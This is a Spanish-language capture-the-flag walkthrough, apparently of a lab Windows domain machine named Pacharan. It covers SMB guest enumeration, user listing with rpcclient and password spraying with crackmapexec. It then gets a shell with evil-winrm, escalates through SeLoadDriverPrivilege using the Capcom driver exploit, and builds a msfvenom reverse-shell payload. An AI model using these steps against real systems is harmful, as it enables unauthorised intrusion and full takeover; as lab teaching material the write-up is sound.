sudo arp-scan --interface=eth1 --localnet

192.168.1.148

nmap: 

![image](https://github.com/user-attachments/assets/14a62243-adf8-4284-9f40-2537cdd9b605)

--------

En el escaneo nos dio muchos puertos pero nos dio: "smb2-time:" 
podemos empezar a lanzar por SMB. 
lanzamos:

     smbmap -H 192.168.1.148 -u invitado


![image](https://github.com/user-attachments/assets/1d33d6d6-deba-47fe-b60d-43316c9e5117)

y nos importa los dos que dicen READ ONLY y volvemos a lanzar un smbmap pero utilizando los IPC:

     smbclient -U invitado //192.168.1.148/NETLOGON2

nos da un txt con: Pericodelospalotes6969

![image](https://github.com/user-attachments/assets/2bc4068f-81e0-4b9b-b8ac-51e4a17df294)

ahora tenemos un usuario y una posible contraseña, lanzamos:

     smbmap -H 192.168.1.148 -u orujo -p Pericodelospalotes6969



![image](https://github.com/user-attachments/assets/2bc577e4-de24-44e5-87d2-84c4db6844df)

ahora nos dio un "ah.txt" lo pasamos a nuestro terminal 

![image](https://github.com/user-attachments/assets/784ad59c-4333-4c12-8ff3-c7bc196762c1)

ahora vamos a enumerar los usuarios con "rpcclient" con el de Orujo

     rpcclient -U 'Orujo' 192.168.1.148 

![image](https://github.com/user-attachments/assets/974c54b7-ace5-4d28-8756-2df6318e73d7)

ahora todos esos nombres los vamos a meter a un txt. 

>Administrador
Invitado
krbtgt
DefaultAccount
Orujo
Ginebra
Whisky
Hendrick
Chivas Regal
Whisky2
JB
Chivas
beefeater
CarlosV
RedLabel
Gordons

lanzamos: 

     crackmapexec smb 192.168.1.148 -u user.txt -p ah.txt

![image](https://github.com/user-attachments/assets/e934eaaa-d8a3-48d0-9c02-ad1570ca12ad)

obtenemos: PACHARAN.THL\Whisky:MamasoyStream2er@ 

ahora que tenemos la contraseña podemos usar "rpcclient" otra vez pero con la contraseña que encontramos. 

     rpcclient -U "Whisky%MamasoyStream2er@" 192.168.1.148 -c 'enumprinters'

nos da: 

![image](https://github.com/user-attachments/assets/03369f0d-1684-4ddd-b2dd-8dec5aaab65e)

donde marque puede que sea una contraseña. 

lanzamos: 

     crackmapexec winrm 192.168.1.148 -u user.txt -p TurkisArrusPuchuchuSiu1

![image](https://github.com/user-attachments/assets/88ee92a6-b636-4295-a1ad-be9f0f3b7e50)

obtenemos: [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)

**"Pwn3d!" se usa cuando un sistema, servidor o cuenta ha sido comprometido exitosamente. Ejemplo: si un atacante logra acceso root a un sistema, puede decir "Pwn3d!" para indicar que ha tomado el control total.**

lanzamos:

    evil-winrm -i 192.168.1.148 -u 'Chivas regal' -p TurkisArrusPuchuchuSiu1

y obtenemos 

![image](https://github.com/user-attachments/assets/0ae3d987-5a41-410c-9099-9acfcc01049d)

ahora vamos a escalar privilegios, vamos a crear una carpeta con los exploit que necesitaremos para escalar y aquí hay una explicación sobre la escalada: https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/

nos vamos a la carpeta raíz y creamos un /tmp y dentro empezamos a cargar los exploit.
https://github.com/JoshMorrison99/SeLoadDriverPrivilege

     upload LoadDriver.exe

     upload Capcom.sys

     upload ExploitCapcom.exe 

pasamos esos exploit a la maquina victima, y nos creamos una reverse shell 

     msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o rev.exe

ahora pasamos la rev.exe a la maquina victima, colocamos el terminal nuestro en escucha y ejecutamos el exploit junto a la reverse shell.

     .\ExploitCapcom.exe C:\tmp\rev.exe

![image](https://github.com/user-attachments/assets/e0f60556-5f68-4574-8212-ede7fc0b0647)

como vemos da: nt authority\system
que es el nivel mas alto de privilegios del sistema. 
